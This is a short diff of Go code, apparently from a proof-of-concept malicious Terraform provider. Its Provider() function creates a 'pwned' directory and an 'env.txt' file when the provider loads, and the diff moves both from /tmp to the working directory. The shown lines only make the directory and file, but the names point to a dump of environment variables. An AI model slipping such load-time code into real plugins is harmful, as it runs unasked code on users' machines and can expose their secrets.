@@ -8,12 +8,12 @@ import (
 
 func Provider() *schema.Provider {
     
-    err := os.Mkdir("/tmp/pwned", 0755)
+    err := os.Mkdir("./pwned", 0755)
     if err != nil && !os.IsExist(err) {
         fmt.Println("[!] Error: ", err)
     }
 
-    file, err := os.Create("/tmp/env.txt")
+    file, err := os.Create("./env.txt")
 	if err != nil {
 		fmt.Println("Error creating file:", err)
 	}
